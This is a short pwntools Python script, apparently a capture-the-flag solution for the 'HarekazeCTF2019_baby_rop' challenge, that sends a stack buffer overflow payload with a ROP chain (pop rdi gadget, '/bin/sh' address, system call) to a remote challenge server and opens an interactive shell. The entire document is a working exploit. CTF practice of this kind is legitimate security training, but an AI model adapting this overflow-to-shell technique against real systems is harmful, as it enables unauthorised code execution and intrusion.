from pwn import *

#context.log_level = 'debug'

pop_rdi_ret = 0x400683
bin_sh_addr = 0x601048
system_addr = 0x4005e3

payload = b'a' * ( 0x10 + 8 ) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)

#p = process('./HarekazeCTF2019_baby_rop')
p = remote('node3.buuoj.cn', 26859)

p.recvuntil('name? ')
p.sendline(payload)
p.interactive()
